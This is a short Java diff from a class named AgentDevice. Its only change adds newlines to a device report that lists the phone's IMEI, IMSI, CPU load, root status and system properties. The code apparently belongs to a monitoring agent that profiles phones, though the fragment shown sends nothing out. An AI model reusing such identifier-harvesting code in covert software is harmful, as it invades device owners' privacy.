@@ -113,11 +113,11 @@ public class AgentDevice extends AgentBase {
 				sb.append(timestamp + "\n"); //$NON-NLS-1$
 			}
 		}
-		sb.append(Messages.getString("9.3")); //$NON-NLS-1$
+		sb.append(Messages.getString("9.3")+"\n"); //$NON-NLS-1$
 		sb.append(Messages.getString("9.4") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Device.self().getImei().length() == 0) {
-			sb.append(Messages.getString("9.6")); //$NON-NLS-1$
+			sb.append(Messages.getString("9.6")+"\n"); //$NON-NLS-1$
 		} else {
 			sb.append(Messages.getString("9.7") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 		}
@@ -127,12 +127,12 @@ public class AgentDevice extends AgentBase {
 		sb.append(Messages.getString("9.13") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
 
 		if (Status.self().haveRoot()) {
-			sb.append(Messages.getString("9.15")); //$NON-NLS-1$
+			sb.append(Messages.getString("9.15") + "\n"); //$NON-NLS-1$
 		} else {
-			sb.append(Messages.getString("9.16")); //$NON-NLS-1$
+			sb.append(Messages.getString("9.16") + "\n"); //$NON-NLS-1$
 		}
 
-		sb.append(Messages.getString("9.17")); //$NON-NLS-1$
+		sb.append(Messages.getString("9.17")+"\n"); //$NON-NLS-1$
 		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();
 
 		while (it.hasNext()) {
